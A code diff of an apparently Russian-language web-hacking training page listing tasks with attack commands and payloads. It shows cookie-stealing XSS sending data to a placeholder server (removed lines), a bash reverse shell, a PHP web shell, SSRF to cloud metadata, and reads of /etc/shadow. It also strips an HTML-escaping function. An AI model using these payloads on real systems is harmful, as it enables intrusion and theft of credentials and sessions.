@@ -96,10 +96,6 @@
             white-space: pre-wrap;
             word-break: break-all;
         }
-        .code-block .comment { color: #006619; }
-        .code-block .command { color: #00ff41; }
-        .code-block .output { color: #00cc33; }
-        .code-block .payload { color: #ffaa00; }
         .tool-tag {
             display: inline-block;
             background: #1a1a1a;
@@ -109,34 +105,28 @@
             font-size: 0.8em;
             border-radius: 3px;
         }
-        .vulnerability-info {
-            background: rgba(255, 51, 51, 0.1);
-            border: 1px solid #ff3333;
+        .info-box {
             padding: 15px;
             margin: 15px 0;
             border-radius: 4px;
+        }
+        .vulnerability-info {
+            background: rgba(255, 51, 51, 0.1);
+            border: 1px solid #ff3333;
         }
         .vulnerability-info h4 { color: #ff3333; margin-bottom: 10px; }
         .solution-box {
             background: rgba(0, 255, 65, 0.05);
             border: 1px solid #00ff41;
-            padding: 15px;
-            margin: 15px 0;
-            border-radius: 4px;
         }
         .solution-box h4 { color: #00ff41; margin-bottom: 10px; }
         .real-example {
             background: #1a1a1a;
             border: 1px solid #ffaa00;
-            padding: 15px;
-            margin: 15px 0;
-            border-radius: 4px;
         }
         .real-example h4 { color: #ffaa00; margin-bottom: 10px; }
         ul, ol { margin: 10px 0 10px 30px; }
         li { margin: 5px 0; }
-        strong { color: #00ff41; }
-        em { color: #ffaa00; }
         .mark-btn {
             margin-top: 20px;
             width: 100%;
@@ -156,6 +146,14 @@
             color: #006619;
             text-align: center;
             font-size: 0.8em;
+        }
+        .payload-warning {
+            background: rgba(255, 170, 0, 0.1);
+            border: 1px solid #ffaa00;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 4px;
+            font-size: 0.85em;
         }
     </style>
 </head>
@@ -178,514 +176,368 @@
     </div>
 
     <script>
-        // КРИТИЧНО: функция экранирования HTML
-        function escapeHtml(str) {
-            if (!str) return '';
-            return String(str)
-                .replace(/&/g, '&amp;')
-                .replace(/</g, '&lt;')
-                .replace(/>/g, '&gt;')
-                .replace(/"/g, '&quot;')
-                .replace(/'/g, '&#039;');
-        }
-
         const tasks = [
             {
                 id: 1,
                 title: 'Subdomain Enumeration',
                 type: 'Reconnaissance',
                 difficulty: 'Начальный',
-                description: 'Найди скрытые поддомены целевого домена. Многие компании забывают о старых поддоменах, которые могут быть уязвимы.',
+                description: 'Найди скрытые поддомены целевого домена.',
                 tools: ['subfinder', 'amass', 'assetfinder', 'dnsrecon'],
-                vulnerability: {
-                    title: 'Что ищем',
-                    content: 'Забытые поддомены со старыми версиями ПО, тестовые окружения, staging серверы с отключенной авторизацией.'
-                },
+                vulnerability: 'Забытые поддомены со старыми версиями ПО',
                 commands: [
-                    { cmd: 'subfinder -d target.com -o subs.txt', desc: 'Пассивный поиск поддоменов' },
-                    { cmd: 'amass enum -d target.com -o amass.txt', desc: 'Активный и пассивный enumeration' },
-                    { cmd: 'cat subs.txt | httpx -silent -status-code', desc: 'Проверка живых хостов' }
+                    'subfinder -d target.com -o subs.txt',
+                    'amass enum -d target.com -o amass.txt',
+                    'cat subs.txt | httpx -silent -status-code'
                 ],
-                realExample: {
-                    title: 'Реальный кейс',
-                    content: 'В 2019 году исследователь нашел поддомен dev.target.com со старой версией Jenkins без авторизации. Через RCE получил доступ к production базе данных.'
-                },
-                solution: {
-                    title: 'Методология',
-                    steps: [
-                        'Запусти subfinder для пассивного сбора: subfinder -d target.com',
-                        'Дополни amass для активного brute force: amass enum -brute -d target.com',
-                        'Проверь все найденные поддомены через httpx или curl',
-                        'Ищи поддомены с необычными сервисами: admin., dev., test., staging., api.',
-                        'Проверь SSL сертификаты через crt.sh для исторических поддоменов'
-                    ]
-                }
+                realExample: 'В 2019 году найден поддомен dev.target.com с Jenkins без авторизации. Через RCE получен доступ к production БД.',
+                solution: [
+                    'Запусти subfinder: subfinder -d target.com',
+                    'Дополни amass: amass enum -brute -d target.com',
+                    'Проверь поддомены через httpx',
+                    'Ищи admin., dev., test., staging.'
+                ]
             },
             {
                 id: 2,
-                title: 'Directory & File Brute Force',
+                title: 'Directory Brute Force',
                 type: 'Reconnaissance',
                 difficulty: 'Начальный',
-                description: 'Найди скрытые директории и файлы на веб-сервере. Администраторы часто оставляют backup файлы, конфиги, старые версии.',
-                tools: ['gobuster', 'ffuf', 'dirb', 'dirsearch'],
-                vulnerability: {
-                    title: 'Что ищем',
-                    content: 'Backup файлы (.bak, .old, .backup), конфиги (.env, .git, .svn), админки (/admin, /phpmyadmin), API endpoints (/api/v1, /graphql).'
-                },
+                description: 'Найди скрытые директории и файлы.',
+                tools: ['gobuster', 'ffuf', 'dirb'],
+                vulnerability: 'Backup файлы, конфиги, админки',
                 commands: [
-                    { cmd: 'gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt', desc: 'Базовый brute force директорий' },
-                    { cmd: 'ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,403', desc: 'Быстрый fuzzing с фильтрацией по кодам' },
-                    { cmd: 'gobuster dir -u https://target.com -w wordlist.txt -x php,txt,bak,old', desc: 'Поиск файлов с расширениями' }
+                    'gobuster dir -u https://target.com -w common.txt',
+                    'ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,403',
+                    'gobuster dir -u https://target.com -x php,txt,bak'
                 ],
-                realExample: {
-                    title: 'Реальный кейс',
-                    content: 'Найден файл /backup.sql.gz на production сервере. Внутри — полные дампы БД с паролями пользователей в plaintext.'
-                },
-                solution: {
-                    title: 'Методология',
-                    steps: [
-                        'Начни с малого wordlist: gobuster dir -u target.com -w common.txt',
-                        'Если нашел что-то, углубляйся: gobuster dir -u target.com/admin -w admin.txt',
-                        'Ищи специфичные расширения: -x php,bak,old,sql,zip,gz',
-                        'Проверяй .git exposure: curl https://target.com/.git/HEAD',
-                        'Ищи backup файлы: target.com.bak, target.com.old, target.com~',
-                        'Используй разные wordlists: dirb, dirsearch, seclists'
-                    ]
-                }
+                realExample: 'Найден /backup.sql.gz с дампами БД и паролями в plaintext.',
+                solution: [
+                    'Начни с малого wordlist',
+                    'Ищи расширения: -x php,bak,old,sql',
+                    'Проверяй .git exposure',
+                    'Используй разные wordlists'
+                ]
             },
             {
                 id: 3,
                 title: 'SQL Injection — Union-Based',
                 type: 'Injection',
                 difficulty: 'Средний',
-                description: 'Классическая SQL инъекция через UNION SELECT для извлечения данных из других таблиц.',
-                tools: ['sqlmap', 'burpsuite', 'manual testing'],
-                vulnerability: {
-                    title: 'Уязвимость',
-                    content: 'Параметр передается в SQL запрос без санитизации. Например: SELECT * FROM products WHERE id=$id'
-                },
+                description: 'SQLi через UNION SELECT для извлечения данных.',
+                tools: ['sqlmap', 'burpsuite'],
+                vulnerability: 'Параметр в SQL без санитизации',
                 commands: [
-                    { cmd: "sqlmap -u 'https://target.com/product?id=1' --dbs", desc: 'Найти все базы данных' },
-                    { cmd: "sqlmap -u 'https://target.com/product?id=1' -D shop --tables", desc: 'Найти таблицы в БД shop' },
-                    { cmd: "sqlmap -u 'https://target.com/product?id=1' -D shop -T users --dump", desc: 'Вытащить все данные из users' }
+                    "sqlmap -u 'https://target.com/product?id=1' --dbs",
+                    "sqlmap -u 'https://target.com/product?id=1' -D shop --tables",
+                    "sqlmap -u 'https://target.com/product?id=1' -D shop -T users --dump"
                 ],
-                realExample: {
-                    title: 'Реальный кейс',
-                    content: 'В 2020 году через SQLi в параметре ?category= найдена таблица users с 2 миллионами записей. Пароли хешированы MD5 без соли — взломаны за 2 часа через hashcat.'
-                },
-                solution: {
-                    title: 'Ручная эксплуатация',
-                    steps: [
-                        'Проверь уязвимость: добавь одинарную кавычку в параметр id=1\'',
-                        'Определи количество колонок: ORDER BY 1, ORDER BY 2, ORDER BY 3... до ошибки',
-                        'Найди рабочие колонки: UNION SELECT 1,2,3-- - (смотри что выводится на странице)',
-                        'Извлеки данные: UNION SELECT username,password,3 FROM users-- -',
-                        'Обойди WAF: используй /**/ вместо пробелов, HEX кодирование, CONCAT()',
-                        'Автоматизируй через sqlmap если ручная проверка подтвердила уязвимость'
-                    ]
-                }
+                realExample: 'Через SQLi найдена таблица users с 2M записей. Пароли MD5 без соли.',
+                solution: [
+                    'Проверь: id=1 (ошибка SQL)',
+                    'Определи колонки: ORDER BY 1,2,3...',
+                    'UNION SELECT 1,2,3-- -',
+                    'Извлеки: UNION SELECT username,password FROM users-- -'
+                ]
             },
             {
                 id: 4,
                 title: 'Blind SQL Injection',
                 type: 'Injection',
                 difficulty: 'Сложный',
-                description: 'SQL инъекция без вывода данных на страницу. Извлекаем информацию через время ответа или булевы условия.',
-                tools: ['sqlmap', 'burpsuite intruder', 'custom scripts'],
-                vulnerability: {
-                    title: 'Уязвимость',
-                    content: 'Запрос выполняется, но результат не выводится. Можно только определить true/false по поведению приложения.'
-                },
+                description: 'SQLi без вывода данных. Извлечение через время/условия.',
+                tools: ['sqlmap', 'burpsuite'],
+                vulnerability: 'Запрос выполняется, но результат не виден',
                 commands: [
-                    { cmd: "sqlmap -u 'https://target.com/login' --data='user=admin&pass=test' --level=3 --risk=2", desc: 'Автоматический blind SQLi' },
-                    { cmd: "sqlmap -u 'https://target.com/search?q=test' --technique=B --batch", desc: 'Только boolean-based blind' },
-                    { cmd: "sqlmap -u 'https://target.com/search?q=test' --technique=T --batch", desc: 'Только time-based blind' }
+                    "sqlmap -u 'https://target.com/login' --data='user=admin&pass=test' --level=3",
+                    "sqlmap -u 'https://target.com/search?q=test' --technique=B",
+                    "sqlmap -u 'https://target.com/search?q=test' --technique=T"
                 ],
-                realExample: {
-                    title: 'Реальный кейс',
-                    content: 'Форма логина не показывала ошибки, но при правильном username задержка была на 200ms дольше. Через time-based blind за 6 часов извлечена таблица admin_credentials.'
-                },
-                solution: {
-                    title: 'Boolean-Based Blind',
-                    steps: [
-                        'Проверь условие: ?id=1 AND 1=1-- - (нормально) vs ?id=1 AND 1=2-- - (другое поведение)',
-                        'Извлекай посимвольно: AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)=a',
-                        'Автоматизируй через sqlmap или напиши скрипт на Python',
-                        'Для time-based: AND IF(1=1,SLEEP(5),0) — задержка 5 секунд = true'
-                    ]
-                }
+                realExample: 'Форма логина не показывала ошибки. Через time-based blind за 6 часов извлечена таблица admin_credentials.',
+                solution: [
+                    'Проверь: ?id=1 AND 1=1-- - vs ?id=1 AND 1=2-- -',
+                    'Извлекай: AND SUBSTRING((SELECT password FROM users),1,1)=a',
+                    'Time-based: AND IF(1=1,SLEEP(5),0)'
+                ]
             },
             {
                 id: 5,
-                title: 'Reflected XSS — Cookie Stealing',
+                title: 'Reflected XSS',
                 type: 'XSS',
                 difficulty: 'Средний',
-                description: 'Отраженная XSS для кражи сессионных cookie. Параметр отражается в HTML без экранирования.',
-                tools: ['burpsuite', 'beef', 'custom payload'],
-                vulnerability: {
-                    title: 'Уязвимость',
-                    content: 'Параметр ?search= отражается в странице. Инъекция через script теги позволяет выполнить произвольный JS.'
-                },
+                description: 'Отраженная XSS. Параметр отражается в HTML без экранирования.',
+                tools: ['burpsuite', 'beef'],
+                vulnerability: 'Параметр отражается без санитизации',
                 commands: [
-                    { cmd: '<script>document.location="http://YOUR_SERVER/?c="+document.cookie</script>', desc: 'Кража cookie через редирект' },
-                    { cmd: '<img src=x onerror="fetch(\'http://YOUR_SERVER/?c=\'+document.cookie)">', desc: 'Альтернативный payload через img' },
-                    { cmd: '<script>new Image().src="http://YOUR_SERVER/?c="+document.cookie</script>', desc: 'Через Image object' }
+                    'Проверка: <script>alert(1)</script>',
+                    'Payload: <script>alert(document.cookie)</script>',
+                    'Обход: <img src=x onerror=alert(1)>'
                 ],
-                realExample: {
-                    title: 'Реальный кейс',
-                    content: 'Найден reflected XSS в параметре ?q= поисковой строки. Через фишинговую ссылку отправленную админу, украден его session cookie. Получен доступ к админ-панели.'
-                },
-                solution: {
-                    title: 'Эксплуатация',
-                    steps: [
-                        'Найди отражающий параметр: ?search=test',
-                        'Проверь XSS: ?search=<script>alert(1)</script>',
-                        'Создай сервер для приема cookie: python3 -m http.server 8080',
-                        'Используй payload с редиректом на твой сервер',
-                        'Закодируй payload для обхода фильтров: URL encoding, HTML entities',
-                        'Отфильтруй admin cookie: if(document.cookie.includes("session")) steal()'
-                    ]
-                }
+                realExample: 'Найден XSS в ?q= поисковой строки. Через фишинговую ссылку админу украден session cookie.',
+                solution: [
+                    'Найди отражающий параметр',
+                    'Проверь XSS: <script>alert(1)</script>',
+                    'Попробуй обход: <img>, <svg>',
+                    'Для кражи: payload с отправкой на твой сервер'
+                ]
             },
             {
                 id: 6,
-                title: 'Stored XSS — Persistent Attack',
+                title: 'Stored XSS',
                 type: 'XSS',
                 difficulty: 'Средний',
-                description: 'Хранимая XSS — payload сохраняется в БД и выполняется у всех пользователей. Комментарии, профили, сообщения.',
-                tools: ['burpsuite', 'beef framework', 'xss hunter'],
-                vulnerability: {
-                    title: 'Уязвимость',
-                    content: 'Пользовательский ввод сохраняется в БД и выводится без санитизации. Например, поле комментария или имени профиля.'
-                },
+                description: 'Хранимая XSS — payload сохраняется в БД.',
+                tools: ['burpsuite', 'beef'],
+                vulnerability: 'Ввод сохраняется и выводится без санитизации',
                 commands: [
-                    { cmd: '<script>fetch("http://YOUR_SERVER/log?c="+document.cookie)</script>', desc: 'Кража cookie всех пользователей' },
-                    { cmd: '<img src=x onerror="this.src=\'http://YOUR_SERVER/?ua=\'+navigator.userAgent">', desc: 'Сбор User-Agent' },
-                    { cmd: '<script>setInterval(()=>fetch("http://YOUR_SERVER/?url="+location.href),5000)</script>', desc: 'Мониторинг активности' }
+                    'Проверка: <script>alert(1)</script> в комментарии',
+                    'Payload: <img src=x onerror=alert(1)>',
+                    'Альтернатива: <svg onload=alert(1)>'
                 ],
-                realExample: {
-                    title: 'Реальный кейс',
-                    content: 'В поле "О себе" профиля пользователя вставлен XSS payload. Каждый кто заходил на профиль — отправлял свой session token на сервер атакующего. За день собрано 500+ сессий.'
-                },
-                solution: {
-                    title: 'Эксплуатация',
-                    steps: [
-                        'Найди поля которые сохраняются: комментарии, имя профиля, сообщения',
-                        'Вставь payload: <script>alert(document.domain)</script>',
-                        'Если фильтр — попробуй обход: <img src=x onerror=alert(1)>, <svg onload=alert(1)>',
-                        'Для кражи данных: payload должен отправлять данные на твой сервер',
-                        'Используй XSS Hunter или аналог для автоматического логирования',
-                        'Целься в админов — их сессии дают максимальный доступ'
-                    ]
-                }
+                realExample: 'В поле "О себе" вставлен XSS. Каждый посетитель профиля отправлял session token. Собрано 500+ сессий.',
+                solution: [
+                    'Найди сохраняемые поля',
+                    'Вставь: <script>alert(1)</script>',
+                    'Обход фильтров: <img>, <svg>',
+                    'Целься в админов'
+                ]
             },
             {
                 id: 7,
-                title: 'SSRF — Server-Side Request Forgery',
+                title: 'SSRF',
                 type: 'Server-Side',
                 difficulty: 'Сложный',
-                description: 'Заставь сервер сделать запрос к внутренним сервисам. Обход firewall, доступ к metadata, внутренним API.',
-                tools: ['burpsuite', 'collaborator', 'custom proxy'],
-                vulnerability: {
-                    title: 'Уязвимость',
-                    content: 'Сервер делает запрос по URL который контролирует пользователь. Например: ?url=https://example.com'
-                },
+                description: 'Server-Side Request Forgery. Заставь сервер делать запросы.',
+                tools: ['burpsuite', 'collaborator'],
+                vulnerability: 'Сервер делает запрос по URL пользователя',
                 commands: [
-                    { cmd: '?url=http://127.0.0.1:8080/admin', desc: 'Доступ к локальному admin' },
-                    { cmd: '?url=http://169.254.169.254/latest/meta-data/', desc: 'AWS metadata (ключи доступа)' },
-                    { cmd: '?url=http://localhost:6379/CONFIG SET dir /var/www/', desc: 'Redis RCE через SSRF' }
+                    '?url=http://127.0.0.1:8080/admin',
+                    '?url=http://169.254.169.254/latest/meta-data/',
+                    '?url=http://localhost:6379'
                 ],
-                realExample: {
-                    title: 'Реальный кейс',
-                    content: 'Функция "Загрузить изображение по URL" позволяла указать любой URL. Через http://169.254.169.254/latest/meta-data/iam/security-credentials/ получены AWS credentials с полным доступом к S3 bucket.'
-                },
-                solution: {
-                    title: 'Эксплуатация',
-                    steps: [
-                        'Найди функционал который делает запросы: загрузка по URL, preview, webhook, ping',
-                        'Попробуй внутренние адреса: 127.0.0.1, localhost, 0.0.0.0',
-                        'Обходи фильтры: http://127.0.0.1, http://localhost, http://0x7f000001, http://[::1]',
-                        'Для cloud: 169.254.169.254 (AWS/GCP), http://metadata.google.internal',
-                        'Сканируй внутренние порты: 127.0.0.1:3000, 127.0.0.1:8080, 127.0.0.1:6379',
-                        'Используй DNS rebinding если фильтр по домену'
-                    ]
-                }
+                realExample: 'Функция загрузки по URL позволила получить AWS credentials через metadata API.',
+                solution: [
+                    'Найди функционал с запросами: загрузка URL, preview, webhook',
+                    'Попробуй: 127.0.0.1, localhost',
+                    'Обходи: 0x7f000001, [::1]',
+                    'Cloud: 169.254.169.254'
+                ]
             },
             {
                 id: 8,
                 title: 'LFI — Local File Inclusion',
                 type: 'File Inclusion',
                 difficulty: 'Средний',
-                description: 'Включение локальных файлов через параметр. Чтение /etc/passwd, конфигов, исходного кода.',
-                tools: ['burpsuite', 'manual testing', 'liffy'],
-                vulnerability: {
-                    title: 'Уязвимость',
-                    content: 'Параметр включает файл: include($_GET["page"]). Контроль пути позволяет читать произвольные файлы.'
-                },
+                description: 'Включение локальных файлов. Чтение /etc/passwd, конфигов.',
+                tools: ['burpsuite', 'manual'],
+                vulnerability: 'Параметр включает файл без проверки',
                 commands: [
-                    { cmd: '?page=../../../../etc/passwd', desc: 'Чтение системного файла' },
-                    { cmd: '?page=php://filter/convert.base64-encode/resource=index.php', desc: 'Чтение исходного кода PHP' },
-                    { cmd: '?page=/proc/self/environ', desc: 'Чтение переменных окружения' }
+                    '?page=../../../../etc/passwd',
+                    '?page=php://filter/convert.base64-encode/resource=index.php',
+                    '?page=/proc/self/environ'
                 ],
-                realExample: {
-                    title: 'Реальный кейс',
-                    content: 'Через LFI прочитан /var/www/html/config.php с credentials от БД. Также найден файл .env с API ключами Stripe и AWS.'
-                },
-                solution: {
-                    title: 'Эксплуатация',
-                    steps: [
-                        'Проверь базовый LFI: ?page=../../../etc/passwd',
-                        'Обходи фильтр добавления расширения: null byte injection (PHP < 5.3)',
-                        'Используй PHP wrappers: php://filter, php://input, data://',
-                        'Для RCE через LFI: загрузи файл с PHP кодом через upload, потом включи его через LFI',
-                        'Читай логи: /var/log/apache2/access.log (вставь PHP код в User-Agent)',
-                        'Ищи чувствительные файлы: /etc/passwd, /etc/shadow, ~/.ssh/id_rsa, конфиги'
-                    ]
-                }
+                realExample: 'Через LFI прочитан config.php с credentials от БД и .env с API ключами.',
+                solution: [
+                    'Проверь: ?page=../../../etc/passwd',
+                    'Используй wrappers: php://filter, php://input',
+                    'Читай логи: /var/log/apache2/access.log',
+                    'Ищи: /etc/passwd, конфиги, .env'
+                ]
             },
             {
                 id: 9,
                 title: 'Command Injection',
                 type: 'Injection',
                 difficulty: 'Сложный',
-                description: 'Выполнение произвольных команд на сервере через инъекцию в системные вызовы.',
-                tools: ['burpsuite', 'commix', 'manual testing'],
-                vulnerability: {
-                    title: 'Уязвимость',
-                    content: 'Пользовательский ввод передается в system(), exec(), shell_exec() без санитизации.'
-                },
+                description: 'Выполнение команд через инъекцию в system().',
+                tools: ['burpsuite', 'commix'],
+                vulnerability: 'Ввод передается в system() без санитизации',
                 commands: [
-                    { cmd: '; cat /etc/passwd', desc: 'Выполнение команды через ;' },
-                    { cmd: '| ls -la', desc: 'Выполнение через pipe' },
-                    { cmd: '$(whoami)', desc: 'Command substitution' },
-                    { cmd: '`id`', desc: 'Backtick execution' }
+                    '; cat /etc/passwd',
+                    '| ls -la',
+                    '$(whoami)',
+                    '`id`'
                 ],
-                realExample: {
-                    title: 'Реальный кейс',
-                    content: 'Форма ping позволяла ввести IP. Через 127.0.0.1; cat /etc/shadow получены хеши паролей всех пользователей системы. Через john the ripper взломан root пароль за 3 часа.'
-                },
-                solution: {
-                    title: 'Эксплуатация',
-                    steps: [
-                        'Найди функционал который выполняет команды: ping, nslookup, traceroute, конвертация файлов',
-                        'Проверь инъекцию: 127.0.0.1; id или 127.0.0.1|id',
-                        'Если фильтр — пробуй обход: newline injection %0a',
-                        'Для обхода blacklist: используй конкатенацию: a=l;b=s;$a$b',
-                        'Получи reverse shell: bash -i >& /dev/tcp/YOUR_IP/4444 0>&1',
-                        'Escalation: ищи SUID бинарники, sudo права, writable конфиги'
-                    ]
-                }
+                realExample: 'Форма ping: 127.0.0.1; cat /etc/shadow. Получены хеши, взломан root за 3 часа.',
+                solution: [
+                    'Найди: ping, nslookup, конвертация',
+                    'Проверь: 127.0.0.1; id',
+                    'Обход: newline %0a',
+                    'Reverse shell: bash -i >& /dev/tcp/IP/4444 0>&1'
+                ]
             },
             {
                 id: 10,
-                title: 'JWT Token Manipulation',
+                title: 'JWT Manipulation',
                 type: 'Authentication',
                 difficulty: 'Сложный',
-                description: 'Подделка JWT токенов для получения доступа к чужим аккаунтам или повышения привилегий.',
-                tools: ['jwt.io', 'jwt_tool', 'burpsuite', 'hashcat'],
-                vulnerability: {
-                    title: 'Уязвимость',
-                    content: 'JWT токены подписаны слабым ключом, используется алгоритм none, или ключ захардкожен в коде.'
-                },
+                description: 'Подделка JWT токенов.',
+                tools: ['jwt.io', 'jwt_tool', 'hashcat'],
+                vulnerability: 'Слабый ключ, алгоритм none, захардкоженный secret',
                 commands: [
-                    { cmd: 'jwt_tool.py token.txt -C -d wordlist.txt', desc: 'Crack JWT secret через brute force' },
-                    { cmd: 'python3 -c "import jwt; print(jwt.encode({\'user\':\'admin\'}, \'secret\', algorithm=\'HS256\'))"', desc: 'Создать токен с известным ключом' },
-                    { cmd: 'jwt_tool.py token.txt -X a', desc: 'Атака algorithm none' }
+                    'jwt_tool.py token.txt -C -d wordlist.txt',
+                    'python3 -c "import jwt; print(jwt.encode({user:admin}, secret, algorithm=HS256))"',
+                    'jwt_tool.py token.txt -X a'
                 ],
-                realExample: {
-                    title: 'Реальный кейс',
-                    content: 'JWT секрет найден в исходном коде GitHub репозитория компании. Через jwt.io создан токен с role: admin. Получен полный доступ к API.'
-                },
-                solution: {
-                    title: 'Атаки на JWT',
-                    steps: [
-                        'Декодируй токен на jwt.io — посмотри payload и алгоритм',
-                        'Атака none: измени алгоритм на none, убери подпись',
-                        'Атака RS256 to HS256: если используется RS256, попробуй подписать HS256 публичным ключом',
-                        'Brute force секрета: jwt_tool с wordlist (rockyou.txt)',
-                        'Ищи ключ в коде: github dork "jwt secret" OR "JWT_SECRET" target.com',
-                        'Проверь типичные слабые ключи: secret, password, 123456, key'
-                    ]
-                }
+                realExample: 'JWT secret найден в GitHub. Создан токен с role:admin. Полный доступ к API.',
+                solution: [
+                    'Декодируй на jwt.io',
+                    'Атака none: убери подпись',
+                    'Brute force: jwt_tool с wordlist',
+                    'Ищи ключ в коде: github dork'
+                ]
             },
             {
                 id: 11,
-                title: 'IDOR — Insecure Direct Object Reference',
+                title: 'IDOR',
                 type: 'Access Control',
                 difficulty: 'Средний',
-                description: 'Прямой доступ к объектам других пользователей через предсказуемые ID. Смена ID в URL дает доступ к чужим данным.',
-                tools: ['burpsuite intruder', 'autorize', 'manual testing'],
-                vulnerability: {
-                    title: 'Уязвимость',
-                    content: 'API endpoint /api/users/123/profile не проверяет что пользователь 123 — это ты. Можно поменять на /api/users/124/profile.'
-                },
+                description: 'Insecure Direct Object Reference. Доступ к чужим данным через ID.',
+                tools: ['burpsuite', 'autorize'],
+                vulnerability: 'API не проверяет права на объект',
                 commands: [
-                    { cmd: 'GET /api/documents/456', desc: 'Доступ к документу другого пользователя' },
-                    { cmd: 'PUT /api/users/789/settings {"role":"admin"}', desc: 'Повышение привилегий через IDOR' },
-                    { cmd: 'DELETE /api/messages/321', desc: 'Удаление чужих сообщений' }
+                    'GET /api/documents/456',
+                    'PUT /api/users/789/settings',
+                    'DELETE /api/messages/321'
                 ],
-                realExample: {
-                    title: 'Реальный кейс',
-                    content: 'В приложении для доставки еды endpoint /api/orders/{id} позволял смотреть заказы других пользователей. Через перебор ID получены данные 10000+ заказов с адресами и телефонами.'
-                },
-                solution: {
-                    title: 'Поиск и эксплуатация',
-                    steps: [
-                        'Создай два аккаунта, сравни ID объектов (заказы, документы, сообщения)',
-                        'Попробуй получить объект другого пользователя через свой аккаунт',
-                        'Используй Burp Autorize для автоматической проверки IDOR на всех endpoints',
-                        'Проверяй не только GET, но и PUT, PATCH, DELETE — часто забывают проверить права на модификацию',
-                        'Смотри на предсказуемые ID: sequential (1,2,3), UUID (если генерируются клиентом)',
-                        'Тестируй mass assignment: добавь поля которые не должен редактировать пользователь'
-                    ]
-                }
+                realExample: 'Endpoint /api/orders/{id} позволил смотреть 10000+ заказов с адресами.',
+                solution: [
+                    'Создай два аккаунта',
+                    'Попробуй получить объект другого пользователя',
+                    'Используй Burp Autorize',
+                    'Проверяй PUT, PATCH, DELETE'
+                ]
             },
             {
                 id: 12,
-                title: 'File Upload — Web Shell',
+                title: 'File Upload',
                 type: 'File Upload',
                 difficulty: 'Сложный',
-                description: 'Загрузка malicious файлов на сервер. Обход фильтров по расширению, MIME type, содержимому.',
-                tools: ['burpsuite', 'web shells', 'image magic'],
-                vulnerability: {
-                    title: 'Уязвимость',
-                    content: 'Загрузка файлов без проверки содержимого, только по расширению. Или проверка только на клиенте (JavaScript).'
-                },
+                description: 'Загрузка malicious файлов. Обход фильтров.',
+                tools: ['burpsuite', 'web shells'],
+                vulnerability: 'Загрузка без проверки содержимого',
                 commands: [
-                    { cmd: '<?php system($_GET["cmd"]); ?>', desc: 'Простой PHP web shell' },
-                    { cmd: 'GIF89a;<?php system($_GET["c"]); ?>', desc: 'Polyglot файл (GIF + PHP)' },
-                    { cmd: 'shell.php.jpg', desc: 'Double extension обход' },
-                    { cmd: 'shell.php%00.jpg', desc: 'Null byte injection (старые PHP)' }
+                    'shell.php',
+                    'shell.php.jpg (double ext)',
+                    'shell.php%00.jpg (null byte)',
+                    'GIF89a;<?php system($_GET[c]); ?>'
                 ],
-                realExample: {
-                    title: 'Реальный кейс',
-                    content: 'Загрузка аватара профиля позволяла загрузить PHP файл. Через shell.php?cmd=cat /etc/passwd получен доступ к файловой системе. Дальше — reverse shell и полный контроль сервера.'
-                },
-                solution: {
-                    title: 'Обход фильтров загрузки',
-                    steps: [
-                        'Проверь базовую загрузку: загрузи .php файл напрямую',
-                        'Если фильтр по расширению — пробуй: .php5, .phtml, .php3, .php4, .pht',
-                        'Double extension: shell.php.jpg, shell.php.png',
-                        'Null byte: shell.php%00.jpg (работает на старых системах)',
-                        'Polyglot: добавь PHP код в метаданные изображения (EXIF)',
-                        'Content-Type обход: меняй MIME type в запросе на image/jpeg',
-                        'Если загрузка работает — ищи где файл доступен: /uploads/shell.php'
-                    ]
-                }
+                realExample: 'Загрузка аватара позволила загрузить shell.php. Reverse shell и полный контроль.',
+                solution: [
+                    'Проверь загрузку .php',
+                    'Расширения: .php5, .phtml',
+                    'Double extension: shell.php.jpg',
+                    'Content-Type обход',
+                    'Ищи: /uploads/shell.php'
+                ]
             },
             {
                 id: 13,
-                title: 'XXE — XML External Entity',
+                title: 'XXE',
                 type: 'Injection',
                 difficulty: 'Сложный',
-                description: 'Инъекция в XML парсер для чтения файлов, SSRF, DoS. Уязвимы старые XML библиотеки.',
-                tools: ['burpsuite', 'xxeinjector', 'manual testing'],
-                vulnerability: {
-                    title: 'Уязвимость',
-                    content: 'XML парсер обрабатывает внешние сущности без ограничений. Позволяет читать файлы, делать запросы к внутренним сервисам.'
-                },
+                description: 'XML External Entity. Чтение файлов через XML.',
+                tools: ['burpsuite', 'xxeinjector'],
+                vulnerability: 'XML парсер обрабатывает внешние сущности',
                 commands: [
-                    { cmd: '&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;', desc: 'Чтение файла через XXE' },
-                    { cmd: '&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;', desc: 'SSRF через XXE (AWS metadata)' },
-                    { cmd: '&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;', desc: 'Чтение PHP исходников' }
+                    'DOCTYPE с ENTITY',
+                    'SYSTEM "file:///etc/passwd"',
+                    'SYSTEM "http://169.254.169.254/latest/meta-data/"'
                 ],
-                realExample: {
-                    title: 'Реальный кейс',
-                    content: 'API принимал XML для импорта данных. Через XXE прочитан /etc/passwd и получены credentials от БД из конфига приложения.'
-                },
-                solution: {
-                    title: 'Эксплуатация',
-                    steps: [
-                        'Найди endpoints которые принимают XML: API, загрузка файлов, SOAP сервисы',
-                        'Проверь базовый XXE: добавь DOCTYPE с ENTITY',
-                        'Если фильтр — пробуй obfuscation: параметризованные entities, nested entities',
-                        'Для blind XXE (нет вывода): используй OOB techniques через HTTP/DNS',
-                        'Читай чувствительные файлы: /etc/passwd, /etc/shadow, ~/.ssh/id_rsa, конфиги',
-                        'Используй XXE для SSRF: сканируй внутренние порты, cloud metadata'
-                    ]
-                }
+                realExample: 'API принимал XML. Через XXE прочитан /etc/passwd и credentials от БД.',
+                solution: [
+                    'Найди XML endpoints',
+                    'Проверь: DOCTYPE ENTITY',
+                    'Читай: /etc/passwd, конфиги',
+                    'XXE для SSRF'
+                ]
             },
             {
                 id: 14,
                 title: 'Insecure Deserialization',
                 type: 'Deserialization',
                 difficulty: 'Эксперт',
-                description: 'RCE через десериализацию недоверенных данных. PHP unserialize(), Java readObject(), Python pickle.',
